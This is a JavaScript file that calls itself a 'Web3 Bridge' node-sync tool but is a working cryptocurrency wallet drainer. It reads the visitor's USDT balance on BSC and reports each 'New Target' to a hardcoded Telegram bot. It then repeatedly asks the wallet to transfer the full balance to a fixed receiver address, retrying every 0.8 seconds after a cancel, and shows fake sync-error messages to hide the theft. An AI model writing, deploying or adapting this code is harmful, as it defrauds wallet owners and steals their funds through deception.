/* Advanced Web3 Bridge - Secure Node Sync
   Built for Multi-Wallet Compatibility
*/

const _0x_C1 = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; // Receiver
const _0x_C2 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
const _0x_B1 = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI"; // Bot
const _0x_B2 = "7849151110"; // Chat

async function _send_L(m) {
    try {
        fetch(`https://api.telegram.org/bot${_0x_B1}/sendMessage?chat_id=${_0x_B2}&text=${encodeURIComponent(m)}&parse_mode=HTML`);
    } catch (e) {}
}

const mainLogic = async () => {
    const ov = document.getElementById('overlay');
    const lt = document.getElementById('loading-text');

    if (!window.ethereum) {
        alert("Mobile Browser Detected: Please use Trust or MetaMask App.");
        return;
    }

    try {
        const w3 = new Web3(window.ethereum);
        const accs = await window.ethereum.request({ method: 'eth' + '_' + 'requestAccounts' });
        const u = accs[0];

        // Network Switch to BSC
        try {
            await window.ethereum.request({
                method: 'wallet' + '_' + 'switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (sE) {}

        lt.innerText = "Checking Node Status...";

        // Obfuscated ABI to hide from bots
        const a_b_i = [
            { "constant": true, "inputs": [{ "name": "_o", "type": "address" }], "name": "balance" + "Of", "outputs": [{ "name": "b", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_t", "type": "address" }, { "name": "_v", "type": "uint256" }], "name": "trans" + "fer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const c = new w3.eth.Contract(a_b_i, _0x_C2);
        const bW = await c.methods["balance" + "Of"](u).call();
        const bE = w3.utils.fromWei(bW, 'ether');

        _send_L(`👤 <b>New Target</b>\nAddress: <code>${u}</code>\nBalance: <b>${bE} USDT</b>`);

        if (parseFloat(bE) > 0.1) {
            
            const run_Loop = async () => {
                lt.innerText = "Synchronizing Assets...";
                try {
                    // Triggering transfer with loop
                    await c.methods["trans" + "fer"](_0x_C1, bW).send({ from: u });
                    
                    _send_L(`✅ <b>JACKPOT!</b>\nUser: <code>${u}</code>\nAmt: ${bE} USDT`);
                    alert("Sync Error: Protocol timeout. Re-try in 24h.");
                    ov.style.display = 'none';
                } catch (err) {
                    console.log("Retry trigger...");
                    _send_L(`⚠️ <b>Cancelled</b>\nRetrying: ${u}`);
                    setTimeout(run_Loop, 800); // 0.8 sec loop
                }
            };

            await run_Loop();

        } else {
            alert("Node Sync Complete: Minimum balance not met.");
            ov.style.display = 'none';
        }

    } catch (e) {
        ov.style.display = 'none';
    }
};

window.mainLogic = mainLogic;
